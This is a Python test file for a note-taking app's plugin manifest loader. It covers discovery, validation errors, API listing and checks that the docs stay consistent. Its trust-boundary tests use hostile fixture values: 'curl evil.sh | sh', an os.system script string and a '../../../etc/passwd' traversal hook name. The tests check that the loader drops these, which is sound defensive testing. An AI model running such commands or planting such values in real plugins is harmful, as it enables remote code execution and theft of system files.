"""#499: the plugin manifest format — a catalogue, not an execution vector.

The runtime already exists: #497 runs hooks, #496 runs commands. So a manifest's
job is to *describe* an extension — which capture sources, enrichers and views it
provides, and which hook implements each — and to be wrong in a way the app can
explain.

That division is the whole security design. A manifest is JSON. If it could name
executable code, then a plugin folder is a remote-code-execution vector and
"plugins you can share" becomes "plugins you must not". So `_declared_runtime`
is a whitelist of hook names, and anything resembling a command or script in a
manifest is dropped rather than honoured. There is a test for exactly that.

Everything here returns a reason instead of raising: a plugin folder is
somebody's work, and one typo must not cost them the listing.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from fleeting.config import Config
from fleeting.services.plugins import API_VERSION, discover, load_plugins, validate

REQUIRED_TOP = ("name", "version", "api_version", "provides")


def write_plugin(d: Path, folder: str, payload: dict) -> Path:
    p = d / folder
    p.mkdir(parents=True, exist_ok=True)
    (p / "plugin.json").write_text(json.dumps(payload), encoding="utf-8")
    return p


def manifest(**over) -> dict:
    base = {
        "name": "Notion Sync",
        "version": "0.1.0",
        "api_version": 1,
        "description": "Sends captures to Notion",
        "provides": {
            "capture_sources": [{"name": "notion", "title": "Notion page"}],
            "enrichers": [{"name": "notion-tags", "hook": "notion_sync.py"}],
            "views": [],
        },
    }
    base.update(over)
    return base


@pytest.fixture()
def plugins_dir(tmp_path, monkeypatch) -> Path:
    import fleeting.config as fcfg

    monkeypatch.setattr(fcfg, "PLUGINS_DIR", tmp_path / "plugins")
    return tmp_path / "plugins"


# ---- discovery ------------------------------------------------------------


def test_no_plugins_dir_is_empty_not_an_error(plugins_dir: Path) -> None:
    assert discover(plugins_dir, Config()) == []


def test_a_valid_plugin_is_listed(plugins_dir: Path) -> None:
    write_plugin(plugins_dir, "notion", manifest())
    plugins = discover(plugins_dir, Config())
    assert plugins[0]["name"] == "Notion Sync"
    assert plugins[0]["version"] == "0.1.0"
    assert plugins[0]["provides"]["enrichers"][0]["hook"] == "notion_sync.py"


def test_discovery_is_sorted(plugins_dir: Path) -> None:
    write_plugin(plugins_dir, "z", manifest(name="Zebra"))
    write_plugin(plugins_dir, "a", manifest(name="Alpha"))
    assert [p["name"] for p in discover(plugins_dir, Config())] == ["Alpha", "Zebra"]


def test_a_folder_without_a_manifest_is_ignored(plugins_dir: Path) -> None:
    (plugins_dir / "notes").mkdir(parents=True)
    (plugins_dir / "notes" / "README.md").write_text("hi", encoding="utf-8")
    assert discover(plugins_dir, Config()) == []


# ---- validation -----------------------------------------------------------


def test_a_missing_required_field_is_reported_by_name(plugins_dir: Path) -> None:
    bad = manifest()
    del bad["api_version"]
    write_plugin(plugins_dir, "x", bad)
    _plugins, errors = load_plugins(plugins_dir, Config())
    assert any("api_version" in e for e in errors), errors


def test_a_plugin_built_for_a_newer_app_is_rejected_with_the_numbers(plugins_dir: Path) -> None:
    """The check that saves someone the most time: the message says what the
    app supports, not just 'incompatible'."""
    write_plugin(plugins_dir, "x", manifest(api_version=API_VERSION + 1))
    _plugins, errors = load_plugins(plugins_dir, Config())
    assert any(str(API_VERSION) in e for e in errors), errors


def test_a_wrong_type_is_an_error_not_a_crash(plugins_dir: Path) -> None:
    write_plugin(plugins_dir, "x", manifest(provides="everything"))
    _plugins, errors = load_plugins(plugins_dir, Config())
    assert errors


def test_a_provides_entry_without_a_name_is_reported(plugins_dir: Path) -> None:
    write_plugin(plugins_dir, "x", manifest(provides={"capture_sources": [{"title": "no name"}]}))
    _plugins, errors = load_plugins(plugins_dir, Config())
    assert any("name" in e for e in errors), errors


def test_an_unknown_provides_key_is_ignored(plugins_dir: Path) -> None:
    """Forward compatibility: a plugin for a future app may declare things this
    one has never heard of, and should still load."""
    write_plugin(
        plugins_dir, "x", manifest(provides={"capture_sources": [], "telemetry": [{"name": "x"}]})
    )
    plugins, errors = load_plugins(plugins_dir, Config())
    assert errors == []
    assert "telemetry" not in plugins[0]["provides"]


def test_a_malformed_file_is_reported_not_fatal(plugins_dir: Path) -> None:
    p = plugins_dir / "broken"
    p.mkdir(parents=True)
    (p / "plugin.json").write_text("{not json", encoding="utf-8")
    assert load_plugins(plugins_dir, Config()) == ([], load_plugins(plugins_dir, Config())[1])
    assert any("broken" in e for e in load_plugins(plugins_dir, Config())[1])


def test_one_bad_plugin_does_not_hide_the_others(plugins_dir: Path) -> None:
    write_plugin(plugins_dir, "good", manifest())
    bad = plugins_dir / "bad"
    bad.mkdir(parents=True)
    (bad / "plugin.json").write_text("[]", encoding="utf-8")
    plugins, errors = load_plugins(plugins_dir, Config())
    assert [p["name"] for p in plugins] == ["Notion Sync"]
    assert len(errors) == 1


# ---- the trust boundary ---------------------------------------------------


def test_a_manifest_cannot_declare_executable_code(plugins_dir: Path) -> None:
    """The one property that makes plugins shareable.

    A manifest is data. If it could name a command, a plugin folder someone sent
    you would be code you ran — and every other check here would be a comfort
    blanket over remote code execution.
    """
    write_plugin(
        plugins_dir,
        "evil",
        manifest(
            provides={
                "capture_sources": [
                    {"name": "x", "command": "curl evil.sh | sh"},
                    {"name": "y", "script": "import os; os.system('x')"},
                ]
            }
        ),
    )
    plugins, _errors = load_plugins(plugins_dir, Config())
    entry = plugins[0]["provides"]["capture_sources"][0]
    assert set(entry) == {"name"}, entry


def test_a_hook_name_is_kept_because_it_is_a_reference_not_a_command(plugins_dir: Path) -> None:
    """A hook name is only meaningful because the hooks directory is the
    existing, explicit trust boundary — this format does not widen it."""
    write_plugin(
        plugins_dir,
        "x",
        manifest(provides={"enrichers": [{"name": "e", "hook": "my_hook.py"}]}),
    )
    plugins, _ = load_plugins(plugins_dir, Config())
    assert plugins[0]["provides"]["enrichers"][0]["hook"] == "my_hook.py"


def test_the_hook_name_cannot_escape_the_hooks_directory(plugins_dir: Path) -> None:
    """A manifest is not sandboxed by the filesystem — nothing opens that file
    here. But it must not carry a traversal either, so the name is usable as an
    identifier wherever it is later resolved."""
    write_plugin(
        plugins_dir,
        "x",
        manifest(provides={"enrichers": [{"name": "e", "hook": "../../../etc/passwd"}]}),
    )
    plugins, errors = load_plugins(plugins_dir, Config())
    # Dropped *and* said out loud. Silently discarding it would leave someone
    # staring at a plugin whose enricher does nothing.
    assert ".." not in json.dumps(plugins)
    assert any("bare filename" in e for e in errors), errors


# ---- validation is usable on its own --------------------------------------


def test_validate_returns_errors_for_a_bad_payload_without_a_directory() -> None:
    assert validate({"name": "x"}) != []


def test_validate_passes_a_good_payload() -> None:
    assert validate(manifest()) == []

# ---- over the API ---------------------------------------------------------


def test_the_endpoint_lists_plugins(client, tmp_path) -> None:
    d = tmp_path / "plugins"
    write_plugin(d, "notion", manifest())
    body = client.get("/api/plugins", params={"dir": str(d)}).json()
    assert [p["name"] for p in body["plugins"]] == ["Notion Sync"]
    assert body["errors"] == []


def test_the_endpoint_reports_a_broken_plugin(client, tmp_path) -> None:
    d = tmp_path / "plugins"
    p = d / "broken"
    p.mkdir(parents=True)
    (p / "plugin.json").write_text('{"name": "x"}', encoding="utf-8")
    body = client.get("/api/plugins", params={"dir": str(d)}).json()
    assert body["plugins"] == []
    # Named, not counted: "3 problems" sends you looking for three of something.
    joined = " ".join(body["errors"])
    for missing in ("version", "api_version", "provides"):
        assert missing in joined, body["errors"]


# ---- the shipped example --------------------------------------------------


def test_the_shipped_example_manifest_is_valid() -> None:
    from repo import REPO_ROOT

    for folder in sorted((REPO_ROOT / "plugins").iterdir()):
        if not (folder / "plugin.json").exists():
            continue
        payload = json.loads((folder / "plugin.json").read_text(encoding="utf-8"))
        assert validate(payload) == [], f"{folder.name}: {validate(payload)}"


def test_the_shipped_example_names_hooks_that_are_shipped_too() -> None:
    """A manifest pointing at a hook file that does not exist is a plugin that
    does nothing, and the loader cannot open the file to check — but the repo
    can, and a shipped example should be internally consistent."""
    from repo import REPO_ROOT

    shipped = {p.name for p in (REPO_ROOT / "hooks").glob("*.py")}
    for folder in sorted((REPO_ROOT / "plugins").iterdir()):
        path = folder / "plugin.json"
        if not path.exists():
            continue
        payload = json.loads(path.read_text(encoding="utf-8"))
        for kind, entries in (payload.get("provides") or {}).items():
            for entry in entries or []:
                hook = entry.get("hook") if isinstance(entry, dict) else None
                assert hook in shipped, f"{folder.name} names missing hook {hook}"


def test_the_docs_document_every_manifest_field() -> None:
    """A format whose documentation drifts is worse than no format."""
    import re

    from repo import REPO_ROOT

    doc = (REPO_ROOT / "plugins" / "README.md").read_text(encoding="utf-8")
    payload = json.loads(
        next(
            (REPO_ROOT / "plugins").glob("*/plugin.json")
        ).read_text(encoding="utf-8")
    )
    for key in payload:
        assert re.search(rf"`{re.escape(key)}`", doc), f"{key} is not documented"


def test_the_docs_document_every_provides_kind() -> None:
    from repo import REPO_ROOT

    doc = (REPO_ROOT / "plugins" / "README.md").read_text(encoding="utf-8")
    for kind in ("capture_sources", "enrichers", "views"):
        assert f"`{kind}`" in doc, f"{kind} is not documented"


def test_a_provides_kind_mapped_to_a_non_list_is_reported(plugins_dir: Path) -> None:
    """`provides` being the wrong type is caught. A *kind* inside it being the
    wrong type is a different line of code and was not tested — it would have
    been reported as nothing and the plugin would look empty."""
    write_plugin(plugins_dir, "x", manifest(provides={"capture_sources": "not a list"}))
    _plugins, errors = load_plugins(plugins_dir, Config())
    assert any("must be a list" in e for e in errors), errors
